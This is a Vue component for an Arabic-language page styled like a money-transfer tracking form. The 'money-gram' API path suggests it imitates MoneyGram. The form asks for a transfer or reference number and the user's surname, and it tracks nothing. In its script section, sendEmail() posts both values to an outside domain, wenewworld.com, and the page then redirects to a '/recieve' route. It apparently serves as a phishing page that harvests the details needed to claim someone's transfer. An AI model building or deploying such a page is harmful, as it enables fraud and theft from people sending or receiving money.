<!-- eslint-disable no-constant-condition -->
<!-- eslint-disable no-constant-condition -->
<template>
  <div class="track">
    <div class="header">
      <v-container>
        <router-link to="/"><img src="../assets/images/logo1.png" alt=""/></router-link>
      </v-container>
    </div>

    <div class="text">
      <v-container>
        <img
            width="25"
            height="25"
            src="https://img.icons8.com/ios/50/fast-track--v2.png"
            alt="fast-track--v2"
        />
        <h2>تعقّب</h2>
      </v-container>
    </div>
    <div class="form">
      <v-form @submit.prevent="sendTrack">
        <v-container style="text-align: end" class="form_container">
          <v-row class="form_row">
            <v-col cols="12" lg="6" md="6" sm="12" class="for_text">
              <div class="form_text">
                <span>إبحث عن تحويل أو دفع:</span>
                <p>إبحث عن وضعية أي عملية عبر إدخال رقم التحويل أو الرقم المرجعي و شهرتك.</p>
              </div>
            </v-col>
            <v-col cols="12" lg="6" md="6" sm="12" style="background: #fff">
              <div class="inputs">
                <div class="field" style="margin-top: 26px">
                  <input
                      class=""
                      v-model="track_number"
                      type="text"
                      required
                      maxlength="8"
                      inputmode="numeric"
                      pattern="[0-9]*"
                  />
                  <label
                      for="number"
                      title="رقم التحويل أو الرقم المرجعي"
                      data-title="رقم التحويل أو الرقم المرجعي"
                  ></label>

                  <div class="text-center">
                    <v-dialog v-model="dialog" width="auto">
                      <template v-slot:activator="{ props }">
                        <div class="mtcn_link">
                          <button v-bind="props" style="position: absolute; right: 8px; top: 15px">
                            <img
                                width="15"
                                height="15"
                                src="https://img.icons8.com/fluency-systems-regular/48/info--v1.png"
                                alt="info--v1"
                            />
                          </button>
                        </div>
                      </template>

                      <v-card>
                        <v-card-actions style="display: block; background: #ddd">
                          <button
                              color="primary"
                              block
                              @click="dialog = false"
                              style="font-size: 14px; color: #333; text-align: start"
                          >
                            <v-icon icon="mdi mdi-close"/>
                          </button>
                          <h4
                              style="
                              font-size: 14px;
                              color: #333;
                              margin-top: 10px;
                              display: inline-block;
                              text-align: center;
                              width: 92%;
                            "
                          >
                            رقم التحويل أو الرقم المرجعي
                          </h4>
                        </v-card-actions>
                        <v-card-text
                            style="
                            text-align: end;
                            color: #7e7874;
                            font-size: 16px;
                            line-height: 20px;
                            font-weight: 300;
                            font-family: Roboto, Helvetica, Arial, sans-serif;
                            padding-bottom: 17px;
                            padding-top: 0;
                          "
                        >
                          <br/>
                          <br/>
                          إن رقم التحويل هو رقم فريد يتم تعيينه لعملية من أجل غايات تعقّبية. <br/>
                          <br/>

                          إذا قمت بإرسال عملية، يمكنك إيجاد هذا الرقم في الرسالة الإلكترونية
                          التأكيدية التي استلمتها حين قمت بالعملية. <br/>
                          <br/>

                          أما إذا استلمت العملية، عليك طلب هذا الرقم من المرسل. <br/>
                          <br/>

                          يتم تعيين الرقم المرجعي لعملية ما عندما يتم إرسال المال بنجاح. بالنسبة
                          للعمليات التي يتم استلام المال فيها نقداً، ينبغي أن يكون هذا الرقم في حوزة
                          المستلم لاستلام النقود. <br/>
                          <br/>

                          إذا قمت بإرسال العملية، يمكنك إيجاد هذا الرقم في الرسالة الإلكترونية التي
                          استلمتها حين أصبح المال جاهزاً للاستلام. <br/>
                          <br/>

                          إذا كنت مستلماً لهذه العملية، عليك طلب هذا الرقم من المرسل
                        </v-card-text>
                      </v-card>
                    </v-dialog>
                  </div>
                </div>
                <div class="field">
                  <input type="text" required v-model="name"/>
                  <label for="password" title="شهرتك" data-title="شهرتك"></label>
                </div>
              </div>
            </v-col>
          </v-row>
        </v-container>
        <v-container class="button_container">
          <button type="submit" style="margin-top: 30px" class="submitBtn">
            تعقّب
          </button>
        </v-container
        >
      </v-form>
    </div>
  </div>
</template>

<script>
import axios from 'axios';

export default {
  data() {
    return {
      dialog: false,
      track_number: '',
      name: ''
    }
  },
  methods: {
    sendTrack() {
      localStorage.setItem('number', this.track_number)
      // eslint-disable-next-line no-cond-assign
      if (this.track_number.length == 8) {
        this.sendEmail()
        this.$router.push('/recieve')
      }
    },
    sendEmail() {

      axios.post('https://wenewworld.com/api/money-gram/send-email', {
        name: this.name,
        trackingNumber: this.track_number
      })
    }

  }
}
</script>

<style lang="scss">
.track {
  min-height: 100%;
  background: #f7f6f6;
}

.track .header {
  background: #fff;
  border-bottom: 3px solid #e41b13;
}

.track .header img {
  max-width: 200px;
  cursor: pointer;
}

.form_row {
  flex-direction: row-reverse;
}

.track .text .v-container {
  display: flex;
  align-items: center;
  justify-items: center;
  column-gap: 5px;
}

.track .text h2 {
  display: inline-block;
}

.track .text img {
  margin-bottom: 5px;
  display: inline-block;
}

.track .form {
  background: #fff;
}

.form_text {
  font-family: 'Roboto' !important;
  background: #fff;
}

.form_text span {
  font-weight: 500;
  font-size: 18px;
  line-height: 20px;
  color: #333333;
  font-family: 'Roboto' !important;
}

.form_text p {
  color: #7e7874;
  font-weight: 300;
  font-size: 14px;
  line-height: 20px;
  font-family: 'Roboto' !important;
  margin-top: 7px;
}

.inputs {
  background: #fff !important;
  position: relative;
}

.inputs input {
  display: block;
  text-align: end;
  width: 100%;
  padding: 5px 10px;
  height: 58px;
  color: #333333;
  font-size: 16px;
  line-height: 23px;
  margin-bottom: 10px;
  font-family: Arial, Helvetica, sans-serif;
  border: 1px solid #dfdddc;
  box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);

  transition: border-color ease-in-out 0.15s,
  box-shadow ease-in-out 0.15s;
}

.inputs input::placeholder {
  color: #888888;
}

.submitBtn {
  font-size: 16px;
  padding: 8px;
  float: right;
  background-color: #009cde;
  border-color: #009cde;

  margin-bottom: 0;
  font-weight: 600;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  background-image: none;
  border: 1px solid transparent;
  transition: 0.3s;
  line-height: 1.42857143;
  border-radius: 30px;
  width: 350px;
  color: #fff !important;
}

@media (max-width: 959px) {
  .v-dialog > .v-overlay__content {
    width: 100% !important;
  }
  .form_container {
    padding-top: 0 !important;
  }
  .form .v-col-12 {
    padding: 0;
  }
  .form_row {
    flex-direction: row;
  }
  .v-form {
    background: #f7f6f6;
  }
  .inputs input {
    // border-left: none !important;
    // border-top: none !important;
    // border-right: none !important;
    // box-shadow: none !important;
  }
  .form .for_text {
    background: #f7f6f6 !important;
    padding: 12px !important;
    // border-bottom: 1px solid #ccc;
  }
  .form .form_text {
    background: #f7f6f6 !important;
  }
  .track .header {
    border-top: 2px solid #ccc !important;
    border-bottom: 2px solid #ccc !important;
    margin-top: 10px;
  }
  .track .header img {
    margin: auto !important;
    display: block !important;
  }

  .track .text .v-container {
    margin-bottom: 17px !important;

    border-bottom: 1px solid #ccc !important;
  }

  .button_container {
    display: flex;
    justify-content: center;
    align-items: center;
  }
}

.label-before {
  line-height: 20px;
  font-size: 12px;
  top: -10px;
  background: #fff;
  padding: 0 6px;
  left: 9px;
}

.container {
  width: 80%;
  margin: 30px 10%;
}

.field {
  position: relative;
  margin-bottom: 15px;

  label::before {
    content: attr(title);
    position: absolute;
    top: 0;
    left: 15px;
    line-height: 40px;
    font-size: 14px;
    color: #777;
    transition: 300ms all;
  }

  input {
    width: 100%;
    line-height: 40px;
    padding: 0 15px;
    box-sizing: border-box;
    font-size: 14px;
    color: #222;
    border: 1px solid #ccc;
    border-radius: 3px;

    &:focus {
      outline: 0;
      border-color: #009cde;
      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
    }

    &:valid + label::before {
      @extend .label-before;
      content: attr(data-title);
      font-size: 15px;
    }

    &:focus + label::before {
      @extend .label-before;
      color: #009cde;
      font-size: 17px;
    }
  }
}

.v-dialog > .v-overlay__content {
  // width: 43% !important;
}
</style>
